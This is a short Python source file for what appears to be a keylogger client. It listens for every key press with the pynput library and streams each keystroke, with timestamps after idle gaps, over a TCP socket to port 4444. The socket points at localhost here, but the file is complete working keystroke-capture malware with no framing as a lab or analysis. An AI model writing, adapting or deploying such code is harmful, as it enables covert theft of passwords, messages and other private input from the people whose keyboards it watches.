import socket
from pynput import keyboard
import time

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('127.0.0.1', 4444))

def on_press(key):
    try:
        global end_time
        end_time = time.time()
        if(end_time - start_time > 60):
            timestamp_to_send = "[ " + str(end_time) + " ]" + '\n'
            client_socket.send(timestamp_to_send.encode('utf-8'))
        client_socket.send(str(key).encode('utf-8'))
    except Exception as e:
        print("Error occured: ", e)
        return

def on_release(key):
    global start_time
    start_time = time.time()

def main():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()



if __name__ == "__main__":
    main()
